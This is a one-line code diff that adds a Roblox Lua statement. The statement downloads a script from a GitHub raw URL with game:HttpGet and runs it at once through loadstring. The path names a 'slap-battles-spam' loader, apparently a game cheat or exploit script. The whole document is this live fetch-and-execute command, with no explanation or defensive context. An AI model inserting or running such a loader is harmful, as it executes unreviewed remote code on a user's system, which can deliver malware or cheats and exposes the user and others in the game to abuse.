@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HarmonicPigeonExalt/loaders/main/loaders/update-slap-battles-spam0-e332sehjf0ccm7.lua"))()
